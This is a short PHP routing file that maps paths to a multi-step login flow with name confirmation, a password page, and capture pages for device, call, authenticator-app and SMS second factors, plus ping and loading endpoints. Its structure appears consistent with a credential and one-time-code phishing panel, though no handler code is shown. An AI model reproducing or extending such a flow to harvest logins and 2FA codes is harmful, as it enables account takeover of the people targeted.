<?php

require_once("{$_SERVER['DOCUMENT_ROOT']}/router.php");

get('/', 'views/login_1.php');
post('/', 'views/login_1.php');

get('/confirm_name', 'views/login_2.php');
post('/confirm_name', 'views/login_2.php');
get('/login', 'views/login_3.php');
post('/login', 'views/login_3.php');
get('/confirm_device', '2fa/device.php');
get('/confirm_call', '2fa/call.php');
post('/confirm_call', '2fa/call.php');
get('/confirm_gauth', '2fa/2fa.php');
post('/confirm_gauth', '2fa/2fa.php');
get('/confirm_sms', '2fa/sms.php');
post('/confirm_sms', '2fa/sms.php');
get('/ping', 'home.php');
post('/ping', 'home.php');
get('/loading', "views/loading.php");

any('/404', 'views/login_1.php');
